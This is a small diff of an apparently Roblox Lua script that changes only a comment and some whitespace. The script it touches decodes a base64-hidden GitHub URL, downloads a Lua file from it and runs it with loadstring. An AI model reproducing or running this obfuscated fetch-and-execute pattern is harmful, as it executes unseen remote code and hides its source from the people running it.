@@ -19,7 +19,7 @@ local function d(data)
 	end))
 end
 
--- URL YANG BENAR
+
 local u = d("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2FyeW5uZGEvc2Ficy9yZWZzL2hlYWRzL21haW4vS0FNSV9BUEEubHVh")
 
 local s = game:HttpGet(u, true)
@@ -27,3 +27,4 @@ local f = loadstring(s)
 if type(f) == "function" then
 	f()
 end
+
